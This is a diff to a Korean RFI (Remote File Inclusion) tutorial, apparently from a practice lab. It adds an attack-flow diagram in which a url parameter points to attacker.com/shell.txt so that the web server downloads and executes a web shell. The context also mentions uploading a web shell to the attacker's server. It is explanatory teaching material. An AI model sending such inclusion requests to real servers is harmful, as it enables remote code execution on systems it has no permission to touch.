@@ -35,6 +35,14 @@ GET /rfi/bronze?url=http://example.com/test.txt HTTP/1.1
 
 ## 💥 2. 취약점 식별 및 악성 스크립트 호스팅 (Exploitation)
 
+### 📊 공격 흐름도 (Attack Flow)
+
+```text
+[ Attacker ] --(url=http://attacker.com/shell.txt)--> [ Web Server ]
+                                                      |-- Downloads & Executes Code
+```
+
+
 RFI 공격을 성공시키려면 해커의 외부에 노출된 웹 서버가 필요합니다. 
 
 ### 💡 Step 1: 해커 서버에 악성 코드(Web Shell) 업로드
